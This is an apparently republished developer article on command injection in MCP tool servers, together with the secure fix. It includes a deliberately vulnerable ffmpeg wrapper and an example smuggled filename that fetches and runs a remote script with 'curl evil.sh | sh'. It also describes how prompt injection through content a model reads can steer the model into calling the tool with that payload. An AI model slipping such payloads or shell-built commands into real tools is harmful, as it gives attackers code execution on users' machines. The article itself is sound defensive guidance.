---
title: "Command injection in MCP tools: the subprocess pattern that hands an LLM a shell"
slug: "command-injection-in-mcp-tools-the-subprocess-pattern-that-hands-an-llm-a-shell"
author: "MCP Security Notes"
source: "devto_python"
published: "Wed, 12 Aug 2026 07:04:44 +0000"
description: "Most MCP (Model Context Protocol) servers ship at least one tool that runs a command, formats a filename, or calls out to git , ffmpeg , or a shell one-liner..."
keywords: "shell, tool, path, str, command, filename, you, subprocess"
generated: "2026-08-12T07:40:00.501496"
---

# Command injection in MCP tools: the subprocess pattern that hands an LLM a shell

## Overview

Most MCP (Model Context Protocol) servers ship at least one tool that runs a command, formats a filename, or calls out to git , ffmpeg , or a shell one-liner. The moment that command string is built from a tool argument, you've handed the model — and anything that can prompt-inject the model — a shell on your box. This is the command-injection sibling of the path-traversal guard I wrote about earlier . Same root cause: untrusted tool input reaching a dangerous sink unbounded. Here's the pattern, why it bites, and the fix that actually holds. The vulnerable pattern A "convenience" tool that shells out: @mcp.tool () def convert_audio ( filename : str , target_format : str ) -> str : """ Convert an audio file to another format. """ cmd = f " ffmpeg -i { filename } output. { target_format } " result = os . popen ( cmd ). read () # <-- sink return result Looks harmless. But filename and target_format are strings the model chooses, and the model can be steered by any document, web page, or file it reads. An attacker who controls a single piece of the model's context can get it to call: filename = "in.wav; curl evil.sh | sh; echo" and now ffmpeg -i in.wav; curl evil.sh | sh; echo output.mp3 runs through the shell. os.system , os.popen , subprocess.run(..., shell=True) , and any f"..." -built command string are all the same sink. Why the usual "fixes" don't hold Escaping quotes / blacklisting ; and | — leaks. Shells have dozens of metacharacters ( ` , $() , && , \n , > , globbing). You will miss one. shlex.quote() on the whole string — better, but people apply it to the wrong thing or forget one argument, and it still assumes you need a shell. You usually don't. The fix: no shell, argument vector, validated inputs Three rules, all of which must hold: import subprocess , re from pathlib import Path ALLOWED_FORMATS = { " mp3 " , " wav " , " flac " , " ogg " } BASE_DIR = Path ( " /srv/media " ). resolve () def convert_audio ( filename : str , target_format : str ) -> str : # 1. Whitelist the enum-like input. Never pattern-match it away — enumerate it. if target_format not in ALLOWED_FORMATS : raise ValueError ( " unsupported format " ) # 2. Resolve and bound any path input (path-traversal guard). src = ( BASE_DIR / filename ). resolve () if not src . is_relative_to ( BASE_DIR ) or not src . is_file (): raise ValueError ( " invalid file " ) out = src . with_suffix ( f " . { target_format } " ) # 3. No shell. Pass an argv LIST so arguments can never be reparsed as commands. proc = subprocess . run ( [ " ffmpeg " , " -i " , str ( src ), str ( out )], capture_output = True , text = True , timeout = 30 , check = False , ) if proc . returncode != 0 : raise RuntimeError ( " conversion failed " ) return str ( out ) Why each rule matters: Whitelist enum inputs. target_format has a small known set. Enumerate it. A regex like ^[a-z0-9]+$ still lets through mkv you didn't mean to support and gives a false sense of safety. Bound path inputs. resolve() + is_relative_to(BASE_DIR) stops ../../etc/passwd and symlink escapes. Argument vector, no shell. subprocess.run([...]) with a list and no shell=True means the OS execs ffmpeg directly with those exact args. "in.wav; curl evil.sh | sh" becomes one literal (nonsensical) filename argument — it is never parsed by a shell, so there is nothing to inject. Add timeout= so a hung or fork-bombing subprocess can't wedge your server, and never interpolate model output straight into a later command. Quick self-audit Grep your server for the sinks: grep -rnE "os \. (system|popen)|shell \s *= \s *True|subprocess \. (run|call|Popen) \( f" server/ Every hit that touches a tool argument is a finding. If you want it checked automatically across path-traversal, command injection, unsafe deserialization, SSRF, and hardcoded secrets in one pass, paste your tool code into the free client-side scanner I built — it runs entirely in your browser, nothing is uploaded: → Free MCP tool security scanner And if you want the full set of copy-paste guards (validated argv wrappers, path bounding, a deserialization allowlist, an SSRF filter, and a pre-deploy checklist) packaged for a whole server, the MCP Server Security Hardening Kit collects them. The rule to remember: an MCP tool argument is attacker-controllable input. Treat every command, path, and deserializer it touches as hostile, and it can't hurt you.

## Key Insights

This article was discovered from the latest RSS feeds and automatically transformed into a readable blog post.

### What You Should Know

- Trending topic in the developer community
- Relevant technology discussion
- Worth exploring for deeper research

## Original Source

https://dev.to/mcpsecnotes/command-injection-in-mcp-tools-the-subprocess-pattern-that-hands-an-llm-a-shell-58cd

## Conclusion

Technology moves quickly. Following curated RSS feeds helps developers stay informed about emerging tools, frameworks, and industry trends.
